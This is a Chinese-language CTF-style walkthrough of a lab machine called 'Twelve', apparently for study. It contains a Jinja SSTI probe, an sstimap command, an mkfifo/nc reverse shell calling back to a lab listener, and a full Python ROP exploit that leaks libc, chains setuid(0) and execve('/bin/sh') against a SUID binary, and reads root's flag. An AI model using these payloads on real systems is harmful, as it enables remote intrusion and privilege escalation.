## Twelve



端口扫描

![image-20260218213214158](/assets/img/posts/twelve/image-20260218213214158.png)

80和1212目录扫描没有收获，初始立足点应该在1212上，而且有python可能有模板注入

简单测了一下，发现确实存在，但是好像有waf

获取基类

```url
{% raw %}
http://192.168.32.193:1212/?num={{%27%27.__class__.__mro__[1].__subclasses__()}}
{% endraw %}
```

![image-20260218213416354](/assets/img/posts/twelve/image-20260218213416354.png)

手动写老是报错，换SSTIMAP

```bash
python3 sstimap.py -u "http://192.168.32.193:1212/?num=1" --os-shell
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.32.142 4444 >/tmp/f
```

能找到12

```
find / -perm -4000 -type f 2>/dev/null
```

实在是不会pwn，ai了好久

一开始的时候直接去 system(/bin/sh) 一直都不行，ai说是“会触发 `/bin/sh` 的安全丢权”，后来试了一下先 etuid(0) 再 execve 就成功了



```bash
cd /tmp && cat > fixed_exploit.py << 'EOF'
#!/usr/bin/env python3
import subprocess
import struct
import time
import select
import re

p64 = lambda x: struct.pack('<Q', x)

def read_until(proc, marker, timeout=3.0):
    data = b''
    end_time = time.time() + timeout
    while time.time() < end_time:
        ready, _, _ = select.select([proc.stdout], [], [], 0.1)
        if ready:
            chunk = proc.stdout.read(1)
            if not chunk:
                break
            data += chunk
            if marker in data:
                return data
    return data

print("[*] Exploiting Twelve")

p = subprocess.Popen(
    ['/usr/local/bin/12'],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    bufsize=0
)

print("[1] Reading menu...")
menu = read_until(p, b': ')

print("[2] Leaking system address...")
p.stdin.write(b'2\n')
p.stdin.flush()

prompt = read_until(p, b': ')
p.stdin.write(b'system\n')
p.stdin.flush()

output = read_until(p, b'Exit\n: ')
output_str = output.decode()
print("Output received:")
print(output_str)

match = re.search(r'Symbol system: (0x[0-9A-Fa-f]+)', output_str)
if not match:
    print("[-] Failed to extract system address")
    print("Full output:", repr(output_str))
    p.terminate()
    exit(1)

system_rt = int(match.group(1), 16)
print(f"\n[+] system @ {hex(system_rt)}")

SYSTEM_OFF = 0x4c330
POP_RDI_OFF = 0x27725
POP_RSI_OFF = 0x28ed9
POP_RDX_OFF = 0xfdc9d
EXECVE_OFF  = 0xd48d0
SETUID_OFF  = 0xd5370     # 确认的 setuid 偏移
BINSH_OFF   = 0x196031
RET_OFF     = 0x270c2

base = system_rt - SYSTEM_OFF
pop_rdi = base + POP_RDI_OFF
pop_rsi = base + POP_RSI_OFF
pop_rdx = base + POP_RDX_OFF
execve_addr = base + EXECVE_OFF
setuid_addr = base + SETUID_OFF
binsh = base + BINSH_OFF
ret = base + RET_OFF

print(f"[+] libc_base   @ {hex(base)}")
print(f"[+] setuid(0)   @ {hex(setuid_addr)}")
print(f"[+] pop_rdi     @ {hex(pop_rdi)}")
print(f"[+] pop_rsi     @ {hex(pop_rsi)}")
print(f"[+] pop_rdx     @ {hex(pop_rdx)}")
print(f"[+] execve      @ {hex(execve_addr)}")
print(f"[+] /bin/sh     @ {hex(binsh)}")

# 构造 payload: 先 setuid(0) 再 execve("/bin/sh", NULL, NULL)
payload = b''
payload += p64(0x4141414141414141)          # saved RBP
payload += p64(ret)                         # ret alignment
payload += p64(pop_rdi)                     # setuid(0)
payload += p64(0)
payload += p64(setuid_addr)
payload += p64(pop_rdi)                     # execve("/bin/sh", NULL, NULL)
payload += p64(binsh)
payload += p64(pop_rsi)
payload += p64(0)                           # argv = NULL
payload += p64(pop_rdx)
payload += p64(0)                           # envp = NULL
payload += p64(execve_addr)

print(f"\n[+] Payload: {len(payload)} bytes")

print("\n[3] Sending payload (option 3)...")
p.stdin.write(b'3\n')
p.stdin.flush()

prompt = read_until(p, b': ')
print("Prompt:", prompt.decode()[-50:])

print(f"Sending length: {len(payload)}")
p.stdin.write(f'{len(payload)}\n'.encode())
p.stdin.flush()
time.sleep(0.3)

print("Sending payload...")
p.stdin.write(payload)
p.stdin.flush()
time.sleep(0.5)

menu = read_until(p, b': ')

print("\n[4] Triggering ROP chain (option 4)...")
p.stdin.write(b'4\n')
p.stdin.flush()
time.sleep(1.2)

rc = p.poll()
print(f"Process status: {rc}")

if rc is not None:
    print(f"[-] Process exited with code {rc}")
    exit(1)

print("\n[5] Sending commands...")
p.stdin.write(b'id\n')
p.stdin.flush()
time.sleep(0.4)

p.stdin.write(b'whoami\n')
p.stdin.flush()
time.sleep(0.4)

p.stdin.write(b'cat /root/root.txt\n')
p.stdin.flush()
time.sleep(0.6)

p.stdin.write(b'echo ===DONE===\n')
p.stdin.flush()
time.sleep(0.4)

print("\n[6] Reading output...")
result = b''
for _ in range(15):
    if select.select([p.stdout], [], [], 0.3)[0]:
        chunk = p.stdout.read(4096)
        if chunk:
            result += chunk
            print(chunk.decode(errors='ignore'), end='')
    else:
        break

print(f"\n{'='*70}")
print(result.decode('utf-8', errors='ignore'))
print(f"{'='*70}")

if 'uid=0' in result.decode(errors='ignore') or 'root' in result.decode(errors='ignore').lower():
    print("\n[+] SUCCESS! Got root shell.")
else:
    print("\n[?] No root uid detected. Check output above.")

p.terminate()
EOF

python3 fixed_exploit.py
```
